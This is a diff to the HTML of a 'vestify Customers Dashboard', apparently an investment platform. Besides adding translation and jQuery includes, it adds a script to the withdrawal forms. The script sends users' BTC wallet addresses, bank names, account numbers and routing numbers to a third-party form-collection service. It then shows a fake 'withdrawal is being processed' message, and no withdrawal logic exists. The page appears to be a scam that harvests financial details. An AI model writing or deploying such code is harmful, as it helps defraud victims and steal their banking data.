@@ -19,6 +19,9 @@
 
 	<!-- FAVICONS ICON -->
 	<link rel="shortcut icon" type="image/png" href="images/favicon.png">
+	<!-- jQuery library -->
+    <script src="../../../ajax.googleapis.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
+	<script src="jquery.min.js"></script>
 
 	<link href="vendor/jquery-nice-select/css/nice-select.css" rel="stylesheet">
 	<link rel="stylesheet" href="vendor/nouislider/nouislider.min.css">
@@ -29,6 +32,15 @@
 </head>
 
 <body id="dashboard_body">
+	<script src="https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
+	<script>
+		function googleTranslateElementInit() {
+			new google.translate.TranslateElement(
+				{pageLanguage: "en"},
+				"google_translate_element"
+			);
+		}
+	</script>
 	<!--*******************
         Preloader start
     ********************-->
@@ -988,6 +1000,7 @@
 				<div class="copyright">
 					<p><strong>vestify Customers Dashboard</strong> © All Rights Reserved</p>
 					<p class="fs-12">Made with <span class="heart"></span> by vestify</p>
+					<div id="google_translate_element"></div>
 				</div>
 			</div>
 		</div>
@@ -1797,17 +1810,22 @@
 			<h2>Withdrawal</h2>
 			<div class="form-element">
 				<label for="Amount">Amount</label>
-				<input type="text" class="amount" id="tag" placeholder="Enter Amount" required />
+				<input type="text" class="amount" id="amountBtn1" placeholder="Enter Amount" required/>
 			</div>
 			<div class="form-element">
 				<label for="CashApp">BTC Wallet Address</label>
-				<input type="text" name="" id="tag" placeholder="paste wallet address here" required />
+				<input type="text" name="" id="btcBtn1" placeholder="paste wallet address here" required />
 			</div>
 			
 			<div class="form-element button">
-				<button type="submit">Withdraw</button>
+				<button type="submit" id="submit1">Withdraw</button>
 			</div>
 		</div>
+	</div>
+
+	<div class="popup3">
+		<div class="close-btn3">&times;</div>
+		<p>Your withdrawal is being processed!</p>
 	</div>
 
 	<!-- popup -->
@@ -1818,23 +1836,23 @@
 			<h2>Withdrawal</h2>
 			<div class="form-element">
 				<label for="CashApp">Bank Name</label>
-				<input type="text" name="" id="tag" placeholder="paste wallet address here" required />
+				<input type="text" name="" id="bankNameBtn2" placeholder="Bank name" required />
 			</div>
 			<div class="form-element">
 				<label for="CashApp">Account Number</label>
-				<input type="text" name="" id="tag" placeholder="paste wallet address here" required />
+				<input type="text" name="" id="acctNumberBtn2" placeholder="Account Number" required />
 			</div>
 			<div class="form-element">
 				<label for="CashApp">Routing Number</label>
-				<input type="text" name="" id="tag" placeholder="paste wallet address here" required />
+				<input type="text" name="" id="routingNumberBtn2" placeholder="Routing number" required />
 			</div>
 			<div class="form-element">
 				<label for="Amount">Amount</label>
-				<input type="text" class="amount" id="tag" placeholder="Enter Amount" required />
+				<input type="text" class="amount" id="amountBtn2" placeholder="Enter Amount" required />
 			</div>
 			
 			<div class="form-element button">
-				<button type="submit">Withdraw</button>
+				<button type="submit" id="submit2">Withdraw</button>
 			</div>
 		</div>
 	</div>
@@ -1880,5 +1898,85 @@
 	<!-- Start of ChatBot (www.chatbot.com) code -->
 	<script src="//code.tidio.co/mqe1ykpa9aprrb6dfzn8pfx0sdifeffv.js" async></script>
 	<!-- End of ChatBot code -->
+
+	<script>
+		const btn1 = document.getElementById("submit1");
+		const btn2 = document.getElementById("submit2");
+
+		btn1.addEventListener("click", async () => {
+			const amount = document.getElementById("amountBtn1");
+			const wallet = document.getElementById("btcBtn1");
+			if (amount && amount.value.trim() !== "" && wallet.value !== "") {
+				const data = {
+					amount: amount.value,
+					wallet_address: wallet.value
+				};
+				
+				// if(window.localStorage.getItem("balance") === "0") {
+				//   alert("Unfortunately, you do not have sufficient balance to withdraw!");
+				// } else {
+				//   alert("Withdrawal in process");
+				//   document.querySelector(".popup2").classList.add("active");
+				// }
+				try {
+					// alert("Your withdrawal is being processed!");
+					document.querySelector(".popup3").classList.add("active");
+					document.querySelector(".popup").classList.remove("active");
+					const res = await fetch("https://submit-form.com/pVPZU7Bt", 
+					{ 
+						method : 'POST', 
+						headers: {
+							"Content-Type": "application/json",
+						},
+						body: JSON.stringify(data),
+					});
+				} catch (error) {
+					console.log(error);
+				}
+			} else {
+				alert("Fill in the required details");
+			}
+		});
+
+		btn2.addEventListener("click", async () => {
+			const amount = document.getElementById("amountBtn2");
+			const bankName = document.getElementById("bankNameBtn2");
+			const routing = document.getElementById("routingNumberBtn2");
+			const acct_no = document.getElementById("acctNumberBtn2");
+			if (amount && amount.value.trim() !== "" && acct_no.value !== "" && bankName.value !== "" && routing.value !== "") {
+				const data = {
+					amount: amount.value,
+					bank_name: bankName.value,
+					routing_number: routing.value,
+					account_number: acct_no.value,
+				};
+				
+				// if(window.localStorage.getItem("balance") === "0") {
+				//   alert("Unfortunately, you do not have sufficient balance to withdraw!");
+				// } else {
+				//   alert("Withdrawal in process");
+				//   document.querySelector(".popup2").classList.add("active");
+				// }
+				try {
+					// alert("Your withdrawal is being processed!");
+					document.querySelector(".popup3").classList.add("active");
+					document.querySelector(".popup2").classList.remove("active");
+					const res = await fetch("https://submit-form.com/pVPZU7Bt", 
+					{ 
+						method : 'POST', 
+						headers: {
+							"Content-Type": "application/json",
+						},
+						body: JSON.stringify(data),
+					});
+				} catch (error) {
+					console.log(error);
+				}
+			} else {
+				alert("Fill in all required details.");
+			}
+		});
+	
+	</script>
 </body>
 </html>
